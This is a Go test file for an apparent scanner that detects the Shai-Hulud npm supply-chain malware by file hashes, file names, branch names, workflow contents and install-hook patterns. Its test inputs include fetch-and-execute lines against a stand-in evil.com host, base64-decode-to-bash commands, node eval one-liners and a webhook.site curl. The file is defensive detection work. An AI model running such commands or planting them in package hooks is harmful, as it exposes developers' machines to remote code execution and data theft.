package ioc_test

import (
	"strings"
	"testing"

	"shai-hulud-scanner/pkg/ioc"
)

func TestIsMaliciousSHA256(t *testing.T) {
	tests := []struct {
		name     string
		hash     string
		wantDesc string
		wantOK   bool
	}{
		{
			name:     "known malicious hash",
			hash:     "46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09",
			wantDesc: "Shai-Hulud bundle.js payload",
			wantOK:   true,
		},
		{
			name:     "another known hash",
			hash:     "b74caeaa75e077c99f7d44f46daaf9796a3be43ecf24f2a1fd381844669da777",
			wantDesc: "Shai-Hulud malicious file",
			wantOK:   true,
		},
		{
			name:     "unknown hash",
			hash:     "0000000000000000000000000000000000000000000000000000000000000000",
			wantDesc: "",
			wantOK:   false,
		},
		{
			name:     "empty hash",
			hash:     "",
			wantDesc: "",
			wantOK:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotDesc, gotOK := ioc.IsMaliciousSHA256(tt.hash)
			if gotDesc != tt.wantDesc {
				t.Errorf("IsMaliciousSHA256() desc = %v, want %v", gotDesc, tt.wantDesc)
			}
			if gotOK != tt.wantOK {
				t.Errorf("IsMaliciousSHA256() ok = %v, want %v", gotOK, tt.wantOK)
			}
		})
	}
}

func TestIsMaliciousSHA1(t *testing.T) {
	tests := []struct {
		name     string
		hash     string
		wantDesc string
		wantOK   bool
	}{
		{
			name:     "known malicious SHA1",
			hash:     "d1829b4708126dcc7bea7437c04d1f10eacd4a16",
			wantDesc: "setup_bun.js (Shai-Hulud 2.0)",
			wantOK:   true,
		},
		{
			name:     "unknown SHA1",
			hash:     "0000000000000000000000000000000000000000",
			wantDesc: "",
			wantOK:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotDesc, gotOK := ioc.IsMaliciousSHA1(tt.hash)
			if gotDesc != tt.wantDesc {
				t.Errorf("IsMaliciousSHA1() desc = %v, want %v", gotDesc, tt.wantDesc)
			}
			if gotOK != tt.wantOK {
				t.Errorf("IsMaliciousSHA1() ok = %v, want %v", gotOK, tt.wantOK)
			}
		})
	}
}

func TestIsMaliciousFileName(t *testing.T) {
	tests := []struct {
		name     string
		filename string
		want     bool
	}{
		{"shai-hulud.js", "shai-hulud.js", true},
		{"shai_hulud.js", "shai_hulud.js", true},
		{"setup_bun.js", "setup_bun.js", true},
		{"bun_environment.js", "bun_environment.js", true},
		{"discussion.yaml", "discussion.yaml", true},
		{"normal.js", "normal.js", false},
		{"index.js", "index.js", false},
		{"empty", "", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ioc.IsMaliciousFileName(tt.filename); got != tt.want {
				t.Errorf("IsMaliciousFileName(%q) = %v, want %v", tt.filename, got, tt.want)
			}
		})
	}
}

func TestIsSuspiciousFileName(t *testing.T) {
	tests := []struct {
		name     string
		filename string
		want     bool
	}{
		{"bundle.js", "bundle.js", true},
		{"setup_bun.js", "setup_bun.js", true},
		{"bun_environment.js", "bun_environment.js", true},
		{"shai-hulud.js", "shai-hulud.js", true},
		{"normal.js", "normal.js", false},
		{"app.js", "app.js", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ioc.IsSuspiciousFileName(tt.filename); got != tt.want {
				t.Errorf("IsSuspiciousFileName(%q) = %v, want %v", tt.filename, got, tt.want)
			}
		})
	}
}

func TestContainsSuspiciousBranchPattern(t *testing.T) {
	tests := []struct {
		name       string
		branchName string
		want       bool
	}{
		{"exact match shai-hulud", "shai-hulud", true},
		{"exact match shai_hulud", "shai_hulud", true},
		{"exact match SHA1HULUD", "SHA1HULUD", true},
		{"contains shai-hulud", "feature/shai-hulud-attack", true},
		{"case insensitive", "SHAI-HULUD", true},
		{"normal branch", "main", false},
		{"feature branch", "feature/add-login", false},
		{"empty", "", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ioc.ContainsSuspiciousBranchPattern(tt.branchName); got != tt.want {
				t.Errorf("ContainsSuspiciousBranchPattern(%q) = %v, want %v", tt.branchName, got, tt.want)
			}
		})
	}
}

func TestContainsSuspiciousWorkflowPattern(t *testing.T) {
	tests := []struct {
		name        string
		content     string
		wantPattern string
		wantFound   bool
	}{
		{
			name:        "contains self-hosted",
			content:     "runs-on: self-hosted",
			wantPattern: "self-hosted",
			wantFound:   true,
		},
		{
			name:        "contains webhook.site",
			content:     "curl https://webhook.site/abc123",
			wantPattern: "webhook.site",
			wantFound:   true,
		},
		{
			name:        "contains SHA1HULUD",
			content:     "name: SHA1HULUD workflow",
			wantPattern: "SHA1HULUD",
			wantFound:   true,
		},
		{
			name:        "contains UUID",
			content:     "bb8ca5f6-4175-45d2-b042-fc9ebb8170b7",
			wantPattern: "bb8ca5f6-4175-45d2-b042-fc9ebb8170b7",
			wantFound:   true,
		},
		{
			name:        "normal workflow",
			content:     "runs-on: ubuntu-latest",
			wantPattern: "",
			wantFound:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotPattern, gotFound := ioc.ContainsSuspiciousWorkflowPattern(tt.content)
			if gotPattern != tt.wantPattern {
				t.Errorf("ContainsSuspiciousWorkflowPattern() pattern = %v, want %v", gotPattern, tt.wantPattern)
			}
			if gotFound != tt.wantFound {
				t.Errorf("ContainsSuspiciousWorkflowPattern() found = %v, want %v", gotFound, tt.wantFound)
			}
		})
	}
}

func TestContainsSuspiciousHookPattern(t *testing.T) {
	tests := []struct {
		name        string
		script      string
		wantPattern string
		wantFound   bool
	}{
		{
			name:        "contains curl",
			script:      "curl http://evil.com/script.sh | bash",
			wantPattern: "curl ",
			wantFound:   true,
		},
		{
			name:        "contains wget",
			script:      "wget http://evil.com/malware",
			wantPattern: "wget ",
			wantFound:   true,
		},
		{
			name:        "contains node -e",
			script:      "node -e 'require(\"child_process\").exec(\"...\")'",
			wantPattern: "node -e",
			wantFound:   true,
		},
		{
			name:        "contains eval",
			script:      "node -e \"eval(Buffer.from('...').toString())\"",
			wantPattern: "eval(",
			wantFound:   true,
		},
		{
			name:        "contains base64",
			script:      "echo $DATA | base64 -d | bash",
			wantPattern: "base64",
			wantFound:   true,
		},
		{
			name:        "normal script",
			script:      "npm run build && npm test",
			wantPattern: "",
			wantFound:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotPattern, gotFound := ioc.ContainsSuspiciousHookPattern(tt.script)
			if gotPattern != tt.wantPattern {
				t.Errorf("ContainsSuspiciousHookPattern() pattern = %v, want %v", gotPattern, tt.wantPattern)
			}
			if gotFound != tt.wantFound {
				t.Errorf("ContainsSuspiciousHookPattern() found = %v, want %v", gotFound, tt.wantFound)
			}
		})
	}
}

func TestPackageFeedURLs(t *testing.T) {
	if len(ioc.PackageFeedURLs) == 0 {
		t.Error("PackageFeedURLs should not be empty")
	}
	for _, url := range ioc.PackageFeedURLs {
		if url == "" {
			t.Error("PackageFeedURLs contains empty URL")
		}
		if !hasPrefix(url, "http://") && !hasPrefix(url, "https://") {
			t.Errorf("PackageFeedURLs contains invalid URL: %s", url)
		}
	}
}

func hasPrefix(s, prefix string) bool {
	return len(s) >= len(prefix) && s[:len(prefix)] == prefix
}

func TestMaliciousFileNames(t *testing.T) {
	if len(ioc.MaliciousFileNames) == 0 {
		t.Error("MaliciousFileNames should not be empty")
	}

	expectedFiles := []string{"shai-hulud.js", "setup_bun.js", "bun_environment.js"}
	for _, expected := range expectedFiles {
		found := false
		for _, f := range ioc.MaliciousFileNames {
			if f == expected {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("MaliciousFileNames missing expected file: %s", expected)
		}
	}
}

func TestMaliciousHashes(t *testing.T) {
	if len(ioc.MaliciousSHA256) == 0 {
		t.Error("MaliciousSHA256 should not be empty")
	}
	if len(ioc.MaliciousSHA1) == 0 {
		t.Error("MaliciousSHA1 should not be empty")
	}

	for hash := range ioc.MaliciousSHA256 {
		if len(hash) != 64 {
			t.Errorf("Invalid SHA256 hash length: %s (got %d, want 64)", hash, len(hash))
		}
	}
	for hash := range ioc.MaliciousSHA1 {
		if len(hash) != 40 {
			t.Errorf("Invalid SHA1 hash length: %s (got %d, want 40)", hash, len(hash))
		}
	}
}

func TestParsePackageCSV(t *testing.T) {
	const csvData = `Package,Version
02-echo,= 0.0.7
@alexcolls/nuxt-ux,= 0.6.1 || = 0.6.2
invalid-row
onlypkg,
,= 1.2.3
`

	constraints, err := ioc.ParsePackageCSV(strings.NewReader(csvData))
	if err != nil {
		t.Fatalf("ParsePackageCSV returned error: %v", err)
	}

	if len(constraints) != 2 {
		t.Fatalf("expected 2 constraints, got %d", len(constraints))
	}

	first := constraints[0]
	if first.Package != "02-echo" {
		t.Errorf("first.Package = %q, want %q", first.Package, "02-echo")
	}
	if first.RawSpec != "= 0.0.7" {
		t.Errorf("first.RawSpec = %q, want %q", first.RawSpec, "= 0.0.7")
	}
	if len(first.Versions) != 1 || first.Versions[0] != "0.0.7" {
		t.Errorf("first.Versions = %#v, want [\"0.0.7\"]", first.Versions)
	}

	second := constraints[1]
	if second.Package != "@alexcolls/nuxt-ux" {
		t.Errorf("second.Package = %q, want %q", second.Package, "@alexcolls/nuxt-ux")
	}
	if second.RawSpec != "= 0.6.1 || = 0.6.2" {
		t.Errorf("second.RawSpec = %q, want %q", second.RawSpec, "= 0.6.1 || = 0.6.2")
	}
	if len(second.Versions) != 2 || second.Versions[0] != "0.6.1" || second.Versions[1] != "0.6.2" {
		t.Errorf("second.Versions = %#v, want [\"0.6.1\", \"0.6.2\"]", second.Versions)
	}
}
